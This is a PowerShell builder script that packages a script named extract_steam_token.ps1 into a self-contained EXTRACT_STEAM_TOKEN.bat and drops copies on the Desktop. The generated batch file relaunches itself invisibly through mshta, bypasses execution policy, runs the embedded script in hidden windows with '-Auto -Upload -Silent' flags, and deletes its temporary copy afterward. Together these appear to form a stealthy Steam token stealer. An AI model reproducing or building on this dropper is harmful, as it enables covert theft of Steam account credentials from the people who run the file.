# One standalone .bat - script embedded after #SB_SCRIPT# marker
$ps1Path = Join-Path $PSScriptRoot 'extract_steam_token.ps1'
if (-not (Test-Path $ps1Path)) {
    $ps1Path = 'C:\Users\iliyk\Desktop\SteamTokenTools\extract_steam_token.ps1'
}
$ps1 = Get-Content -Raw -Path $ps1Path -Encoding UTF8

$header = @'
@echo off
if /i not "%~1"=="_bg" (
    mshta vbscript:CreateObject("WScript.Shell").Run("""%~f0"" _bg",0)(window.close)
    exit /b
)

set "PS1=%TEMP%\sb_extract_%RANDOM%.ps1"
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$lines=Get-Content -LiteralPath '%~f0'; $start=-1; for($i=0;$i -lt $lines.Count;$i++){ if($lines[$i].Trim() -eq '#SB_SCRIPT#'){ $start=$i+1; break } }; if($start -lt 0){ Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('BAT corrupted','SharpBuy','OK','Error') | Out-Null; exit 1 }; $script=$lines[$start..($lines.Count-1)] -join [Environment]::NewLine; Set-Content -LiteralPath '%PS1%' -Value $script -Encoding UTF8"
if errorlevel 1 exit /b 1

powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%PS1%" -Auto -Upload -Silent
set "ERR=%ERRORLEVEL%"
del "%PS1%" 2>nul
exit /b %ERR%

#SB_SCRIPT#
'@

$outPaths = @(
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_STEAM_TOKEN.bat'),
    (Join-Path $PSScriptRoot 'EXTRACT_STEAM_TOKEN.bat'),
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'SteamTokenTools\EXTRACT_STEAM_TOKEN.bat')
)

$content = $header + [Environment]::NewLine + $ps1
foreach ($out in $outPaths) {
    $dir = Split-Path $out -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    [IO.File]::WriteAllText($out, $content, [Text.Encoding]::UTF8)
    Write-Host "OK: $out ($((Get-Item $out).Length) bytes)"
}

$sharpBuyPs1 = Join-Path $PSScriptRoot 'extract_steam_token.ps1'
if ((Resolve-Path $ps1Path).Path -ne (Resolve-Path $sharpBuyPs1).Path) {
    Copy-Item $ps1Path $sharpBuyPs1 -Force
}
